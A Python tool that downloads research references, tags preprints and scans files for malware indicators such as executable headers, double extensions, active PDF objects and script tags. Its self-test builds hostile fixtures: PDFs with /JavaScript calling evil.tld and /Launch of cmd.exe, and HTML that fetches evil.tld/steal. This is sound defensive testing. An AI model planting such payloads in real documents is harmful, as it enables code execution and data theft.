#!/usr/bin/env python3
"""
Shadow Army Reference Downloader & File Safety Verifier (reference_verifier.py)

Enforces the Shadow Army Research Source Policy (Points 1-8):
1. Verifies metadata (DOI/URL, venue/publisher, publication year/version, peer-review status,
   and mandatory `PREPRINT` tag for arXiv).
2. Downloads accessible reference documents locally into `<repo>/docs/references/` (or verifies
   already-downloaded files) so every cited reference is stored offline.
3. Runs a strict 7-Point File Safety & Malware/Exploit Gate on every downloaded/local file:
   - Blocks dangerous extensions (.exe, .dll, .bat, .cmd, .ps1, .vbs, .scr, .msi, .jar, .docm, .xlsm, .lnk, .iso)
   - Blocks double-extension spoofing (e.g. `paper.pdf.exe`, `spec.pdf.ps1`)
   - Verifies magic-byte file headers (`%PDF-` for `.pdf`; rejects `MZ` PE, `\x7fELF`, Mach-O, or ZIP/RAR masquerading as PDF/text)
   - Scans PDF structure for dangerous active content (`/JavaScript`, `/JS`, `/Launch`, `/EmbeddedFiles`, `/RichMedia`, `/XFA`)
   - Scans HTML/Markdown/Text files for active script injection (`<script`, `javascript:`, `<iframe`, `<object`, `<embed`, `onerror=`, `onload=`)
   - Enforces file size bounds (rejects 0-byte files or >100 MB bombs)
   - Computes SHA-256 and records verified metadata in `docs/references/references_manifest.json`
   - Automatically deletes unsafe downloaded files from the local PC (`DELETED_UNSAFE_FILE`).
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import tempfile
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

ALLOWED_EXTENSIONS = {".pdf", ".md", ".txt", ".json", ".yaml", ".yml", ".html", ".htm", ".csv"}

DANGEROUS_EXTENSIONS = {
    ".exe", ".dll", ".so", ".dylib", ".bat", ".cmd", ".ps1", ".vbs", ".vbe",
    ".js", ".jse", ".wsf", ".wsh", ".msc", ".scr", ".msi", ".msp", ".com",
    ".pif", ".jar", ".hta", ".cpl", ".reg", ".inf", ".lnk", ".iso", ".img",
    ".vhd", ".vhdx", ".docm", ".xlsm", ".pptm", ".dotm", ".xltm", ".sh",
}

BINARY_EXECUTABLE_MAGIC: list[tuple[str, bytes]] = [
    ("Windows PE Executable (MZ)", b"MZ"),
    ("Linux ELF Binary", b"\x7fELF"),
    ("Mach-O Binary (32-bit)", b"\xfe\xed\xfa\xce"),
    ("Mach-O Binary (64-bit)", b"\xfe\xed\xfa\xcf"),
    ("Mach-O Binary (Reverse 64-bit)", b"\xcf\xfa\xed\xfe"),
    ("Java Class / Mach-O Universal", b"\xca\xfe\xba\xbe"),
]

# PDF dictionary name tokens that trigger code execution or file launch inside PDF readers
PDF_DANGEROUS_TOKENS: list[tuple[str, re.Pattern[bytes]]] = [
    ("PDF /JavaScript action", re.compile(rb"/(?:JavaScript|JS)\b\s*(?:\(|<|<<|\d+\s+\d+\s+R)")),
    ("PDF /Launch external command", re.compile(rb"/Launch\b")),
    ("PDF /EmbeddedFiles payload", re.compile(rb"/EmbeddedFiles\b")),
    ("PDF /RichMedia Flash/media exploit", re.compile(rb"/RichMedia\b")),
    ("PDF /XFA active form script", re.compile(rb"/XFA\b")),
    ("PDF /SubmitForm or /ImportData", re.compile(rb"/(?:SubmitForm|ImportData|GoToE|GoToR)\b")),
]

TEXT_DANGEROUS_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("HTML <script> tag", re.compile(r"<\s*script\b", re.IGNORECASE)),
    ("HTML <iframe>/<object>/<embed>/<applet> tag", re.compile(r"<\s*(?:iframe|object|embed|applet)\b", re.IGNORECASE)),
    ("Inline event handler (onload/onerror/onclick)", re.compile(r"\bon(?:load|error|click|mouseover|focus)\s*=", re.IGNORECASE)),
    ("javascript: or vbscript: URI", re.compile(r"\b(?:javascript|vbscript|data:text/html)\s*:", re.IGNORECASE)),
]

MAX_FILE_BYTES = 100 * 1024 * 1024  # 100 MB


def check_double_extension(filename: str) -> str | None:
    parts = Path(filename).name.lower().split(".")
    if len(parts) <= 2:
        return None
    for part in parts[1:-1]:
        if f".{part}" in DANGEROUS_EXTENSIONS:
            return f"Double extension contains dangerous inner suffix '.{part}' in '{filename}'"
    if f".{parts[-1]}" in DANGEROUS_EXTENSIONS:
        return f"Double extension ends with dangerous suffix '.{parts[-1]}' in '{filename}'"
    return None


def verify_file_safety(file_path: Path, quarantine_delete: bool = False) -> dict[str, Any]:
    """Run the 7-Point File Safety Gate on a local file."""
    resolved = file_path.resolve()
    reasons: list[str] = []

    if not resolved.exists() or not resolved.is_file():
        return {
            "file": str(resolved),
            "safe": False,
            "status": "FILE_NOT_FOUND",
            "reasons": ["File does not exist or is not a regular file"],
            "quarantine_action": "NONE",
        }

    ext = resolved.suffix.lower()
    double_ext_err = check_double_extension(resolved.name)
    if double_ext_err:
        reasons.append(double_ext_err)

    if ext in DANGEROUS_EXTENSIONS:
        reasons.append(f"Blocked dangerous file extension '{ext}'")
    elif ext not in ALLOWED_EXTENSIONS:
        reasons.append(f"Extension '{ext}' is not in allowed reference formats ({sorted(ALLOWED_EXTENSIONS)})")

    size_bytes = resolved.stat().st_size
    if size_bytes == 0:
        reasons.append("File is empty (0 bytes)")
    elif size_bytes > MAX_FILE_BYTES:
        reasons.append(f"File size ({size_bytes} bytes) exceeds 100 MB safety ceiling")

    raw_bytes = b""
    if size_bytes > 0 and size_bytes <= MAX_FILE_BYTES:
        raw_bytes = resolved.read_bytes()

    # Check 3: Binary executable magic bytes masquerading as a reference document
    for label, magic in BINARY_EXECUTABLE_MAGIC:
        if raw_bytes.startswith(magic):
            reasons.append(f"Binary executable header detected ({label}) inside '{resolved.name}'")

    if raw_bytes.startswith(b"PK\x03\x04"):
        reasons.append(f"ZIP/Office archive header (PK) disguised as '{ext}' in '{resolved.name}'")

    # Check 4: Format-specific inspection
    if ext == ".pdf" and raw_bytes:
        # Must begin with %PDF- within first 1024 bytes (per PDF spec)
        if b"%PDF-" not in raw_bytes[:1024]:
            reasons.append("Invalid PDF header: missing '%PDF-' signature in first 1024 bytes")
        for label, pattern in PDF_DANGEROUS_TOKENS:
            if pattern.search(raw_bytes):
                reasons.append(f"Dangerous active PDF object detected: {label}")

    elif ext in {".md", ".txt", ".json", ".yaml", ".yml", ".csv", ".html", ".htm"} and raw_bytes:
        if b"\x00" in raw_bytes[:4096]:
            reasons.append(f"Null bytes (binary payload) found inside text reference '{resolved.name}'")
        text_content = raw_bytes.decode("utf-8", errors="replace")
        # For Markdown, ignore fenced code blocks when checking HTML tags unless it's .html/.htm
        inspect_text = text_content
        if ext == ".md":
            inspect_text = re.sub(r"```[\s\S]*?```", "", text_content)
        for label, pattern in TEXT_DANGEROUS_PATTERNS:
            if pattern.search(inspect_text):
                reasons.append(f"Active script/injection pattern detected in text/HTML: {label}")

    sha256_hex = hashlib.sha256(raw_bytes).hexdigest() if raw_bytes else ""
    safe = len(reasons) == 0
    quarantine_action = "NONE"

    if not safe and quarantine_delete and resolved.exists():
        try:
            resolved.unlink()
            quarantine_action = "DELETED_UNSAFE_FILE"
        except Exception as exc:
            quarantine_action = f"DELETE_FAILED: {exc}"

    return {
        "file": str(resolved),
        "filename": resolved.name,
        "size_bytes": size_bytes,
        "sha256": sha256_hex,
        "safe": safe,
        "status": "SAFE" if safe else "DANGEROUS_FILE_BLOCKED",
        "reasons": reasons,
        "quarantine_action": quarantine_action,
    }


def classify_source_metadata(
    title: str,
    doi_or_url: str,
    venue: str,
    year: str,
    peer_reviewed: bool | None = None,
) -> dict[str, Any]:
    """Normalize source metadata and enforce PREPRINT tagging for arXiv."""
    lower_id = doi_or_url.lower()
    lower_venue = venue.lower()
    is_arxiv = "arxiv.org" in lower_id or "arxiv" in lower_venue or "10.48550/arxiv" in lower_id

    if is_arxiv and not peer_reviewed:
        source_type = "PREPRINT"
        effective_peer_reviewed = False
        badge = "[PREPRINT]"
    elif any(k in lower_venue for k in ("iso", "iec", "ieee std", "nist", "owasp", "ietf", "rfc", "w3c")):
        source_type = "STANDARD"
        effective_peer_reviewed = True
        badge = "[STANDARD]"
    else:
        source_type = "PEER_REVIEWED" if (peer_reviewed is not False) else "PREPRINT"
        effective_peer_reviewed = bool(peer_reviewed is not False)
        badge = "[PEER-REVIEWED]" if effective_peer_reviewed else "[PREPRINT]"

    return {
        "title": title,
        "doi_or_url": doi_or_url,
        "venue": venue,
        "year": year,
        "source_type": source_type,
        "peer_reviewed": effective_peer_reviewed,
        "citation_badge": badge,
    }


def download_and_verify_reference(
    url: str,
    dest_dir: Path,
    title: str,
    venue: str,
    year: str,
    doi: str = "",
    peer_reviewed: bool | None = None,
    filename: str | None = None,
) -> dict[str, Any]:
    """Download a reference file to dest_dir, run the 7-Point Safety Gate, delete if unsafe, and update manifest."""
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("https", "http"):
        raise ValueError(f"Only http/https URLs are permitted for reference download (got '{parsed.scheme}')")

    dest_dir.mkdir(parents=True, exist_ok=True)
    inferred_name = filename or Path(parsed.path).name or "reference.pdf"
    if "." not in inferred_name:
        inferred_name += ".pdf"
    safe_name = re.sub(r"[^A-Za-z0-9._-]", "_", inferred_name)
    target_path = dest_dir / safe_name

    req = urllib.request.Request(
        url,
        headers={"User-Agent": "ShadowArmy-ReferenceVerifier/1.0 (+https://github.com/RidhuanDEV/claude-skills)"},
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        data = resp.read(MAX_FILE_BYTES + 1)
    target_path.write_bytes(data)

    safety = verify_file_safety(target_path, quarantine_delete=True)
    meta = classify_source_metadata(title=title, doi_or_url=doi or url, venue=venue, year=year, peer_reviewed=peer_reviewed)

    record = {
        **meta,
        "download_url": url,
        "verified_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "safety": safety,
    }

    if safety["safe"]:
        manifest_path = dest_dir / "references_manifest.json"
        manifest: dict[str, Any] = {"references": []}
        if manifest_path.exists():
            try:
                manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
            except Exception:
                manifest = {"references": []}
        manifest["references"] = [r for r in manifest.get("references", []) if r.get("safety", {}).get("filename") != safe_name]
        manifest["references"].append(record)
        manifest_path.write_text(json.dumps(manifest, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")

    return record


def run_self_test() -> dict[str, Any]:
    """Execute Precision & Recall probes on the 7-Point File Safety & Source Policy Verifier (Rigor Protocol Rule 22)."""
    probes: list[dict[str, Any]] = []

    def add_probe(name: str, passed: bool, detail: str) -> None:
        probes.append({"probe": name, "passed": passed, "detail": detail})

    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)

        # --- PRECISION PROBES (5 realistic safe inputs that MUST pass as SAFE) ---
        p1 = root / "iso_29148_excerpt.pdf"
        p1.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n%%EOF\n")
        r1 = verify_file_safety(p1, quarantine_delete=True)
        add_probe("PRECISION-1: Clean standard PDF (`%PDF-1.7`) passes and stays on disk", r1["safe"] and p1.exists(), json.dumps(r1["reasons"]))

        p2 = root / "pdf_mentioning_javascript_in_prose.pdf"
        p2.write_bytes(b"%PDF-1.5\nstream\nThis paper compares Python and JavaScript AST parsers.\nendstream\n%%EOF\n")
        r2 = verify_file_safety(p2, quarantine_delete=True)
        add_probe("PRECISION-2: PDF mentioning the English word 'JavaScript' in body prose (not `/JavaScript` token) is NOT false-flagged", r2["safe"] and p2.exists(), json.dumps(r2["reasons"]))

        p3 = root / "nist_ssdf_notes.md"
        p3.write_text(
            "# NIST SSDF SP 800-218 Summary\n\n"
            "Example blocked snippet in fenced code block:\n"
            "```html\n<script>alert(1)</script>\n```\n",
            encoding="utf-8",
        )
        r3 = verify_file_safety(p3, quarantine_delete=True)
        add_probe("PRECISION-3: Markdown note with fenced code block example passes as SAFE", r3["safe"] and p3.exists(), json.dumps(r3["reasons"]))

        p4 = root / "rfc9110_http.txt"
        p4.write_text("RFC 9110: HTTP Semantics. Status 200 OK.\n", encoding="utf-8")
        r4 = verify_file_safety(p4, quarantine_delete=True)
        add_probe("PRECISION-4: Clean plain-text RFC specification passes as SAFE", r4["safe"] and p4.exists(), json.dumps(r4["reasons"]))

        p5_meta = classify_source_metadata(
            title="Attention Is All You Need",
            doi_or_url="https://arxiv.org/abs/1706.03762",
            venue="arXiv",
            year="2017",
            peer_reviewed=False,
        )
        add_probe(
            "PRECISION-5: arXiv source without peer-reviewed venue is automatically tagged `PREPRINT` (`[PREPRINT]`)",
            p5_meta["source_type"] == "PREPRINT" and not p5_meta["peer_reviewed"] and p5_meta["citation_badge"] == "[PREPRINT]",
            json.dumps(p5_meta),
        )

        # --- RECALL PROBES (5 dangerous inputs that MUST be blocked and deleted) ---
        rc1 = root / "disguised_malware.pdf"
        rc1.write_bytes(b"MZ\x90\x00\x03\x00\x00\x00Fake Windows EXE disguised as PDF")
        rr1 = verify_file_safety(rc1, quarantine_delete=True)
        add_probe(
            "RECALL-1: Windows PE executable (`MZ`) disguised as `.pdf` is blocked and deleted",
            not rr1["safe"] and not rc1.exists() and rr1["quarantine_action"] == "DELETED_UNSAFE_FILE",
            json.dumps(rr1["reasons"]),
        )

        rc2 = root / "paper.pdf.exe"
        rc2.write_bytes(b"MZ\x90\x00")
        rr2 = verify_file_safety(rc2, quarantine_delete=True)
        add_probe(
            "RECALL-2: Double-extension spoof (`paper.pdf.exe`) is blocked and deleted",
            not rr2["safe"] and not rc2.exists(),
            json.dumps(rr2["reasons"]),
        )

        rc3 = root / "exploit_js.pdf"
        rc3.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.launchURL('http://evil.tld')) >>\nendobj\n%%EOF\n")
        rr3 = verify_file_safety(rc3, quarantine_delete=True)
        add_probe(
            "RECALL-3: PDF with embedded `/JavaScript` / `/JS` execution object is blocked and deleted",
            not rr3["safe"] and not rc3.exists(),
            json.dumps(rr3["reasons"]),
        )

        rc4 = root / "exploit_launch.pdf"
        rc4.write_bytes(b"%PDF-1.7\n1 0 obj\n<< /Type /Action /S /Launch /Win << /F (cmd.exe) >> >>\nendobj\n%%EOF\n")
        rr4 = verify_file_safety(rc4, quarantine_delete=True)
        add_probe(
            "RECALL-4: PDF with `/Launch` command execution action is blocked and deleted",
            not rr4["safe"] and not rc4.exists(),
            json.dumps(rr4["reasons"]),
        )

        rc5 = root / "phishing_reference.html"
        rc5.write_text("<html><body><script>fetch('http://evil.tld/steal')</script></body></html>", encoding="utf-8")
        rr5 = verify_file_safety(rc5, quarantine_delete=True)
        add_probe(
            "RECALL-5: HTML reference containing active `<script>` payload is blocked and deleted",
            not rr5["safe"] and not rc5.exists(),
            json.dumps(rr5["reasons"]),
        )

    all_passed = all(p["passed"] for p in probes)
    return {
        "suite": "reference_verifier.py 7-Point File Safety & Source Policy Self-Test",
        "total_probes": len(probes),
        "passed": sum(1 for p in probes if p["passed"]),
        "failed": sum(1 for p in probes if not p["passed"]),
        "all_passed": all_passed,
        "results": probes,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Shadow Army Reference Downloader & 7-Point File Safety Verifier")
    parser.add_argument("--self-test", action="store_true", help="Run precision & recall probes on the file safety verifier")
    sub = parser.add_subparsers(dest="cmd")

    p_scan = sub.add_parser("scan", help="Scan a local reference file or directory for dangerous content")
    p_scan.add_argument("target", help="File or directory path to scan")
    p_scan.add_argument("--quarantine-delete", action="store_true", help="Automatically delete files that fail safety checks")

    p_fetch = sub.add_parser("fetch", help="Download a reference URL to local PC, verify safety, and record in references_manifest.json")
    p_fetch.add_argument("--url", required=True, help="HTTPS URL of the reference document (PDF/MD/TXT/HTML)")
    p_fetch.add_argument("--dest-dir", default="docs/references", help="Local directory to store verified references")
    p_fetch.add_argument("--title", required=True, help="Reference title")
    p_fetch.add_argument("--venue", required=True, help="Publisher, standard body, or venue (e.g. IEEE, ISO, NIST, OWASP, arXiv)")
    p_fetch.add_argument("--year", required=True, help="Publication year or standard version")
    p_fetch.add_argument("--doi", default="", help="DOI or standard identifier")
    p_fetch.add_argument("--peer-reviewed", choices=["true", "false"], default=None, help="Explicit peer-review status")
    p_fetch.add_argument("--filename", default=None, help="Optional local filename")

    args = parser.parse_args()

    if args.self_test:
        summary = run_self_test()
        print(json.dumps(summary, indent=2, ensure_ascii=False))
        return 0 if summary["all_passed"] else 1

    if args.cmd == "scan":
        target = Path(args.target).resolve()
        files = [target] if target.is_file() else [p for p in target.rglob("*") if p.is_file() and p.name != "references_manifest.json"]
        results = [verify_file_safety(f, quarantine_delete=args.quarantine_delete) for f in files]
        all_safe = all(r["safe"] for r in results)
        print(json.dumps({"target": str(target), "checked_count": len(results), "all_safe": all_safe, "results": results}, indent=2, ensure_ascii=False))
        return 0 if all_safe else 1

    if args.cmd == "fetch":
        pr = None if args.peer_reviewed is None else (args.peer_reviewed == "true")
        res = download_and_verify_reference(
            url=args.url,
            dest_dir=Path(args.dest_dir).resolve(),
            title=args.title,
            venue=args.venue,
            year=args.year,
            doi=args.doi,
            peer_reviewed=pr,
            filename=args.filename,
        )
        print(json.dumps(res, indent=2, ensure_ascii=False))
        return 0 if res["safety"]["safe"] else 1

    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
